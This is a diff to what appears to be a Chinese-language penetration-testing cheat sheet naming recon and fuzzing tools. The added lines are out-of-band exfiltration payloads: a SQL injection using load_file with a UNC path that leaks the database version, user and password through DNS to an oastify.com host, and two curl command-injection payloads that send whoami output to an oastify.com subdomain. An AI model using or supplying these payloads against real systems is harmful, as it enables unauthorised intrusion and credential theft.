@@ -11,6 +11,12 @@ ffuf 工具
 模糊测试列表：
 /jenkins/script
 
+# out of band 带外数据
+select load_file(CONCAT('\\\\',(SELECT+@@VERSION),'.',(SELECT+user),'.',(SELECT+password),'.','v950miufeuuf5qgjf4bzv77v0m6du9iy.oastify.com\\vfw'))
+curl `whoami`.yeg3rlzijxziatlmk7g20acy5pbgzbn0.oastify.com
+curl $(whoami).yeg3rlzijxziatlmk7g20acy5pbgzbn0.oastify.com
+
+
 paramspider/arjun 参数测试
 eyewitness 检测url，自动屏幕截图
 waybackurls -dates http://xxxx/xxx.php   存档数据
